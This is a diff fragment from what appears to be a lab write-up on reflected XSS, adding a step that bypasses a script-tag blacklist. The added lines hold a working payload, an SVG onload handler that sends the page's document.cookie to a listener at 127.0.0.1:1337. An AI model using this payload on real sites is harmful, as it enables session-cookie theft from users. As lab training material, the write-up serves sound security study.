@@ -146,6 +146,10 @@ Because its a **reflected XSS**, the malicious code is not stored in the remote 
 
 1. This level can be attacked the same way as the previous one as the developer just changed the blacklisted pattern to `<s*c*r*i*p*t`:
 
+    ```javascript
+    <svg/onload=window.location='http://127.0.0.1:1337/?cookie='%2Bdocument.cookie>
+    ```
+
     ![](high_payload.png)
 
     ```shell
